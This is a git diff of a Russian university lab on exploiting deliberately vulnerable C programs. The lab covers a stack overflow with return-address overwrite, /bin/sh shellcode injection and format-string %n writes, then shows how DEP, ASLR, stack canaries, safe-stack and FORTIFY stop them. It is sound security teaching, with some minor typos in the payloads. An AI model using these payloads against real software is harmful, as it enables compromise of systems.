@@ -1,7 +1,11 @@
 = Лабораторная работа #1: Exploits
+:imagesdir: resources/images
+:doctype: article
+:icons: font
 :lang: ru
-:imagesdir: images
-:toc:
+:source-highlighter: rouge
+:stem: latexmath
+:toc2:
 :toc-title: Содержание
 :figure-caption!:
 
@@ -22,7 +26,7 @@ IMPORTANT: Дабы максимально приблизить своё окр�
 +
 --
 
-[listing]
+[source,bash]
 ----
 x@vbox:~$ sudo apt update
 x@vbox:~$ sudo apt upgrade
@@ -38,7 +42,7 @@ x@vbox:~$ reboot
 +
 --
 
-[listing]
+[source,bash]
 ----
 x@vbox:~$ sudo apt install -y linux-headers-$(uname -r)
 x@vbox:~$ sudo apt install -y build-essential gdb
@@ -53,7 +57,7 @@ NOTE: Пакет gcc-multilib необходим для сборки 32-битн
 +
 --
 
-[listing]
+[source,bash]
 ----
 x@vbox:~$ cd ~/Downloads
 x@vbox:~/Downloads$ chmod u+x ida-free-pc_90_x64linux.run
@@ -69,14 +73,14 @@ NOTE: Версия 9.0 актуальна на момент написания �
 
 Если (скорее всего) IDA после установки не запустится, проверьте, каких плагинов QT не хватает:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/Downloads$ QT_DEBUG_PLUGINS=1 ~/ida-free-pc-9.0/ida
 ----
 
 Если в выводе вы увидите строку наподобие “libxcb-xinerama.so.0: cannot open shared object file: No such file or directory”, требуется доставить библиотеку libxcb-xinerama:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/Downloads$ sudo apt install libxcb-xinerama0
 ----
@@ -89,7 +93,7 @@ NOTE: IDA Free можно поставить на ОС Windows, в этом сл
 +
 --
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/Downloads$ cd ~
 x@vbox:~$ sudo apt install -y git
@@ -106,7 +110,7 @@ x@vbox:~$ cd /tmp && gdb /bin/ls
 
 Для компиляции программ написан make-файл. Необходимо перейти в папку с исходниками примеров examples и выполнить команду make (Посмотрите содержимое файла Makefile!):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~$ cd lab1/examples
 x@vbox:~/lab1/examples$ make
@@ -116,7 +120,7 @@ x@vbox:~/lab1$
 
 Для корректной работы примеров требуется отключить ASLR – механизм защиты исполняемых файлов (см. финальный раздел данного документа):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1$ sudo bash def_off
 x@vbox:~/lab1$
@@ -128,7 +132,7 @@ x@vbox:~/lab1$
 
 Рассмотрим программу auth.c. В контексте обсуждаемой темы нас интересует функция check_auth:
 
-[listing]
+[source,c]
 ----
 int check_auth(char* passwd)
 {
@@ -148,7 +152,7 @@ int check_auth(char* passwd)
 
 Функция проверки пароля реализована просто: сначала копируется пароль в локальный буфер, затем этот пароль сравнивается с двумя возможными значениями функцией strcmp и, если введён один из правильных паролей, значение флага auth_flag устанавливается в 1, в конце возвращается значение этого флага. Как было рассмотрено в Лабораторной работе #2, место под локальные переменные auth_flag и password_buffer выделяется на стеке. Исследуем кадр стека функции check_auth с помощью gdb (рис. 1):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1$ cd examples
 x@vbox:~/lab1/examples$ gdb auth
@@ -184,7 +188,7 @@ image::figure-1.svg[Рис. 1. Стек после пролога функции
 
 Функция strcpy копирует символы из источника в приёмник, пока очередной символ в источнике не равен 0 (признак конца строки). Что произойдёт, если вводимый пароль будет занимать больше 32 символов? Эксперименты:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./auth `python3 -c 'print("A"*0x20)'`
 Access denied!
@@ -197,7 +201,7 @@ x@vbox:~/lab1/examples$
 
 Посмотрим в отладке:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gdb auth
 gdb-peda$ disas /m check_auth
@@ -225,7 +229,7 @@ image::figure-2.svg[Рис. 2. Стек после переполнения бу
 
 Давайте запишем больше байт – скажем, 100.
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./auth `python3 -c 'print("A"*0x64)'`
 Segmentation fault (core dumped)
@@ -240,7 +244,7 @@ image::figure-3.svg[Рис. 3. Стек после ещё большего пе�
 
 Давайте скопируем на место адреса возврата адрес, соответствующий ветке “Access granted”. Дабы найти адрес этой ветки, выведем с помощью gdb дизассемблерный листинг вместе со строками исходного кода (это возможно, так как мы скомпилировали auth.c с ключом -g, см. Makefile):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gdb ./auth
 gdb-peda$ disas /m main
@@ -260,7 +264,7 @@ gdb-peda$
 
 Из части вывода gdb выше видно, что true-ветка оператора if располагается по адресу 0x0804928f, поэтому именно это значение необходимо поместить на место адреса возврата с помощью переполнения (обратите внимание на порядок байтов – почему в обратном порядке? Почему сначала копируем 0x30 = 48 байт "A"?):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./auth `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*0x30 + b"\x8f\x92\x04\x08")'`
 Access granted!
@@ -274,7 +278,7 @@ x@vbox:~/lab1/examples$
 
 Для того, чтобы исправить уязвимость в предыдущей программе, перепишем функцию проверки пароля (файл overflow.c):
 
-[listing]
+[source,c]
 ----
 int check_auth(char* passwd)
 {
@@ -296,7 +300,7 @@ int check_auth(char* passwd)
 
 Как было неоднократно упомянуто, архитектура x86-64 является архитектурой фон-неймановского типа, то есть код и данные хранятся в одном адресном пространстве. Другими словами, если вместо пароля скопировать некоторый код, а адрес возврата перезаписать адресом буфера, то мы можем изменить логику работы программы. Главное – правильно определить адрес буфера, а также необходимо, чтобы вставляемый код, называемый шеллкодом, не содержал нулевых символов.
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./overflow `python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*24 + b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x90" + b"\x90"*31 + b"\x70\xd0\xff\xff")'`
 password_buffer is at address: 0xffffd070
@@ -308,7 +312,7 @@ x@vbox:~/lab1/examples
 
 Посмотрим на вектор эксплуатации в отладке (см. рис. 4):
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gdb overflow
 gdb-peda$ disas /m check_auth
@@ -364,7 +368,7 @@ image::figure-4.svg[Рис. 4. Стек после заливки шеллкод
 
 Иногда использование дополнительной переменной неизбежно, либо же просто повышает читаемость кода. Можно в этом случае использовать статическую переменную, так как статические переменные помещаются в другой сегмент данных (в какой?). Новая функция (файл format.c):
 
-[listing]
+[source,c]
 ----
 int check_auth(char* username, char* passwd)
 {
@@ -387,7 +391,7 @@ int check_auth(char* username, char* passwd)
 
 Попробуем сломать:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./format Run `python3 -c 'print("A"*100)'`
 Run, password_buffer is at address: 0xffffd060
@@ -400,7 +404,7 @@ x@vbox:~/lab1/examples$
 
 Среди отладочного вывода программы format можно увидеть адрес переменной auth_flag. Посмотрим на диапазоны адресов секций исполняемого файла format, для чего воспользуемся утилитой readelf:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ readelf -S ./format
 …
@@ -416,7 +420,7 @@ x@vbox:~/lab1/examples$
 
 Тем не менее, несмотря на внесённые исправления, программа всё ещё уязвима. Обратите внимание на строку printf(username);. Проблема заключается в том, что printf принимает первым аргументом т.н. форматную строку, а следующими аргументами – переменные, значения которых должны быть в эту форматную строку подставлены. Потому если вместо нормального имени пользователя ввести какую-нибудь форматную строку, мы можем прочитать данные со стека. Эксперименты:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./format `python3 -c 'import sys; sys.stdout.buffer.write(b"B"*100 + b"%08x.."*201')` `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*100')`
 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBffffd22d..00000040..08048281..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..f7fba000..00000000..ffffca68..080485b4..ffffcd12..ffffd22d..080485eb..f7fba000..080485e0..00000000..00000000..f7e2ca63..00000003..ffffcb04..ffffcb14..f7feacea..00000003..ffffcb04..ffffcaa4..0804a01c..0804824c..f7fba000..00000000..00000000..00000000..c8b8097b..f2b8ad6b..00000000..00000000..00000000..00000003..080483b0..00000000..f7ff0500..f7e2c979..f7ffd000..00000003..080483b0..00000000..080483d1..0804856d..00000003..ffffcb04..080485e0..08048650..f7feb180..ffffcafc..0000001c..00000003..ffffcd09..ffffcd12..ffffd22d..00000000..ffffd292..ffffd29d..ffffd2b2..ffffd2c5..ffffd2dc..ffffd2ee..ffffd31b..ffffd32c..ffffd344..ffffd35a..ffffd369..ffffd39e..ffffd3a9..ffffd3ba..ffffd3d1..ffffd3e1..ffffd3fc..ffffd40e..ffffd425..ffffd437..ffffd47b..ffffd4af..ffffd4de..ffffd4e5..ffffda06..ffffda1f..ffffda59..ffffda8d..ffffdabd..ffffdaf0..ffffdb4e..ffffdb92..ffffdba9..ffffdc13..ffffdc25..ffffdc46..ffffdc64..ffffdc78..ffffdc81..ffffdc95..ffffdcac..ffffdcbd..ffffdccc..ffffdd02..ffffdd1d..ffffdd30..ffffdd4d..ffffdd5f..ffffdd71..ffffdd8b..ffffdd93..ffffdda0..ffffddaf..ffffddbe..ffffddea..ffffddf4..ffffde0e..ffffde4a..ffffde99..ffffdeab..ffffdecb..ffffded5..ffffdeea..ffffdf09..ffffdf14..ffffdf2e..ffffdf41..ffffdf63..ffffdf77..ffffdf98..ffffdfac..ffffdfcb..ffffdfe4..00000000..00000020..f7fdb420..00000021..f7fdb000..00000010..078bfbff..00000006..00001000..00000011..00000064..00000003..08048034..00000004..00000020..00000005..00000009..00000007..f7fdc000..00000008..00000000..00000009..080483b0..0000000b..000003e8..0000000c..000003e8..0000000d..000003e8..0000000e..000003e8..00000017..00000000..00000019..ffffcceb..0000001f..ffffdfef..0000000f..ffffccfb..00000000..00000000..00000000..00000000..00000000..df000000..747603fb..a3421b96..475557c7..69524c25..00363836..00000000..00000000..662f2e00..616d726f..42420074..42424242.., password_buffer is at address: 0xffffcb40
@@ -431,7 +435,7 @@ x@vbox:~/lab1/examples$
 
 Не чтением единым. Есть ещё один модификатор – %n. Он указывает функции записать количество выведенных на печать символов по адресу, переданному на месте текущего параметра на стеке. Эксперименты:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./format `python3 -c 'import sys; sys.stdout.buffer.write(b "\x2c\xc0\x04\x08"*250 + b"%08x.."*290 + b"%x%n"'` `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*100'`
 ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ffffd361..00000040..f7ffd000..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..41414141..f7fbe4c0..f7fd6f10..ffffc608..08049309..ffffc8a8..ffffd361..f7fbeb30..00000001..00000001..ffffc620..f7ffd020..f7c21519..ffffc89f..00000070..f7ffd000..f7c21519..00000003..ffffc6d4..ffffc6e4..ffffc640..f7e26000..080492ba..00000003..ffffc6d4..f7e26000..ffffc6d4..f7ffcb80..f7ffd020..152e5c5f..6e8bb64f..00000000..00000000..00000000..f7ffcb80..f7ffd020..ec425a00..f7ffda40..f7c214a6..f7e26000..f7c215f3..00000000..0804bf08..ffffc6e4..f7ffd020..00000000..f7fd8f84..f7c2156d..0804c000..00000003..08049090..00000000..080490bc..080492ba..00000003..ffffc6d4..00000000..00000000..f7fcaa90..ffffc6cc..f7ffda40..00000003..ffffc89f..ffffc8a8..ffffd361..00000000..ffffd3c6..ffffd3d6..ffffd434..ffffd447..ffffd45b..ffffd488..ffffd4a9..ffffd4c0..ffffd4ec..ffffd503..ffffd523..ffffd537..ffffd560..ffffd574..ffffd58b..ffffd5a3..ffffd5bf..ffffd5e3..ffffd5ed..ffffd608..ffffd621..ffffd637..ffffd66d..ffffd67a..ffffd685..ffffd697..ffffd6ac..ffffd6bd..ffffdcac..ffffdccd..ffffdcde..ffffdcf8..ffffdd4e..ffffdd65..ffffdd87..ffffdd9e..ffffddb2..ffffddd0..ffffddf0..ffffddf7..ffffde14..ffffde1f..ffffde27..ffffde40..ffffde52..ffffde6d..ffffde8c..ffffdea0..ffffdef5..ffffdf67..ffffdf79..ffffdfaf..ffffdfc6..ffffdfe4..00000000..00000020..f7fc4540..00000021..f7fc4000..00000033..000006f0..00000010..178bfbff..00000006..00001000..00000011..00000064..00000003..08048034..00000004..00000020..00000005..0000000b..00000007..f7fc6000..00000008..00000000..00000009..08049090..0000000b..000003e8..0000000c..000003e8..0000000d..000003e8..0000000e..000003e8..00000017..00000000..00000019..ffffc87b..0000001a..00000002..0000001f..ffffdfef..0000000f..ffffc88b..00000000..00000000..00000000..00000000..c2000000..0eec425a..58d07551..1d8dbf36..691bdba3..00363836..00000000..00000000..00000000..2e000000..726f662f..0074616d..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..0804c02c..804c02c, password_buffer is at address: 0xffffc5a0
@@ -450,7 +454,7 @@ x@vbox:~/lab1/examples$
 
 Перекомпилируем программу overflow.c без дополнительного флага gcc "-z execstack", выключающих DEP, и попробуем повторить эксплуатацию переполнения на стеке:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gcc -g -m32 -fno-PIC -fno-stack-protector overflow.c -o overflow_dep -no-pie
 x@vbox:~/lab1/examples$ ./overflow_dep `python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*24 + b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + b"\x90"*31 + b"\x70\xd0\xff\xff")'`
@@ -466,7 +470,7 @@ DEP позволяет защититься от заливки шеллкода
 
 Попробуем включить ASLR, который ранее мы выключили с помощью скрипта def_off, и посмотрим, как изменится адрес буфера, располагающегося на стеке:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ./overflow 42
 password_buffer is at address: 0xffffd0c0
@@ -483,7 +487,7 @@ x@vbox:~/lab1/examples$
 Попробуем проверить, изменяются ли адреса загрузки библиотек, для чего воспользуемся 
 утилитой ldd:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ ldd /usr/bin/echo
 	linux-vdso.so.1 (0x00007ffee86f7000)
@@ -504,7 +508,7 @@ x@vbox:~/lab1/examples$
 
 Вновь перекомпилируем программу overflow.c, на сей раз без флага gcc "-fno-stack-protector", выключающего механизм SSP, и попробуем повторить эксплуатацию переполнения на стеке:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gcc -g -m32 -fno-PIC overflow.c -o overflow_ssp -no-pie
 x@vbox:~/lab1/examples$ ./overflow_ssp `python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*24 + b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + b"\x90"*31 + b"\x70\xd0\xff\xff")'`
@@ -516,7 +520,7 @@ x@vbox:~/lab1/examples$
 
 Попытка перехвата управления с помощью переполнения была обнаружена во время исполнения финальных инструкций эпилога функции check_auth, что привело к аварийному завершению процесса. Вкратце разберём механизм SSP:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gdb overflow_ssp
 gdb-peda$ disas check_auth
@@ -551,7 +555,7 @@ gdb-peda$
 
 В очередной раз перекомпилируем программу overflow.c, в этот раз используя компилятор clang и флаг "-fsanitize=safe-stack":
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ sudo apt install -y clang
 x@vbox:~/lab1/examples$ clang --version
@@ -568,7 +572,7 @@ x@vbox:~/lab1/examples$
 
 Как и в случае с «классическим» SSP, разделение стека на две части позволяет избежать перехвата управления путём перезаписи адреса возврата на стеке. Рассмотрим основные элементы этого механизма:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gdb overflow_clang_ss
 gdb-peda$ disas /m check_auth
@@ -621,7 +625,7 @@ Dump of assembler code for function check_auth:
 
 В заключительный раз перекомпилируем программу overflow.c и попробуем исполнить наш эксплоит:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gcc -g -m32 -fno-PIC overflow.c -O2 -o overflow_fort -no-pie
 x@vbox:~/lab1/examples$
@@ -646,7 +650,7 @@ x@vbox:~/lab1/examples$
 
 Эта уязвимость достаточно легко обнаруживается компилятором (стандартное поведение gcc – вывести warning пользователю) и ещё проще закрывается: необходимо вместо непосредственной передачи строки в функцию использовать printf с форматной строкой:
 
-[listing]
+[source,c]
 ----
 printf("%s", username);
 ----
@@ -657,7 +661,7 @@ printf("%s", username);
 
 Перекомпилируем format.c без флага -g:
 
-[listing]
+[source,bash]
 ----
 x@vbox:~/lab1/examples$ gcc -m32 -z execstack -fno-PIC -fno-stack-protector -Wno-format-security format.c -o format_glibc_release -no-pie
 x@vbox:~/lab1/examples$ ./format_glibc_release `python3 -c 'import sys; sys.stdout.buffer.write(b"\x2c\xc0\x04\x08"*250 + b"%08x.."*290 + b"%x%n")'` `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*100)'`
